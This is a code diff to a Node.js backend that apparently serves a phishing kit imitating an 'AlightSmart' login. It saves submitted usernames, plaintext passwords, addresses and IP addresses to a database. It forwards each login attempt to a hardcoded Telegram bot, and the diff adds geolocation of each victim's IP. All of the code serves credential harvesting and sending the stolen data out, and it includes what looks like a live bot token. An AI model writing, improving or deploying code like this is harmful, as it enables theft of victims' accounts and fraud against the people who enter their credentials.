@@ -19,6 +19,7 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     password TEXT,
     address TEXT,
     ip TEXT,
+    location TEXT,
     timestamp TEXT
 )`).then(() => console.log("✅ Supabase Connected"))
    .catch(err => console.error("Table Error:", err.message));
@@ -34,14 +35,27 @@ function getRealIP(req) {
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
+async function getLocation(ip) {
+    if (ip === 'Unknown') return 'Unknown Location';
+    try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        if (data.error) return 'Unknown Location';
+        return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
+    } catch (e) {
+        return 'Unknown Location';
+    }
+}
+
 async function sendTelegramNotification(record) {
     const message = `🚨 *New AlightSmart Submission!*\n\n` +
-        `• *Type:* ${record.type || '-'}\n` +
+        `• *Type:* ${record.type}\n` +
         `• *Username:* ${record.username || '-'}\n` +
         `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
-        `• *IP:* ${record.ip || 'Unknown'}\n` +
-        `• *Time:* ${record.timestamp || '-'}\n\n` +
+        `• *IP:* ${record.ip}\n` +
+        `• *Location:* ${record.location}\n` +
+        `• *Time:* ${record.timestamp}\n\n` +
         `🕒 ${new Date().toLocaleString()}`;
 
     try {
@@ -56,24 +70,27 @@ async function sendTelegramNotification(record) {
         });
         console.log("✅ Telegram notification sent!");
     } catch (err) {
-        console.error("❌ Telegram notification failed:", err.message);
+        console.error("❌ Telegram failed:", err.message);
     }
 }
 
 // ==================== SAVE RECORD ====================
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    
+    const location = await getLocation(ip);
+
     try {
         await pool.query(
-            "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
-            [type, username, password, address, ip, timestamp]
+            "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
+            [type, username, password, address, ip, location, timestamp]
         );
         
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 
-        // Send Telegram Notification immediately
-        await sendTelegramNotification({ type, username, password, address, ip, timestamp });
+        // Send notification ONLY for actual submissions (Login Attempts)
+        if (type === 'Login Attempt') {
+            await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
+        }
 
     } catch (err) {
         console.error("Save Error:", err.message);
@@ -137,8 +154,8 @@ app.post('/api/clear', async (req, res) => {
     await pool.query("DELETE FROM records");
     res.json({ message: 'All records cleared' });
 });
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-
 });
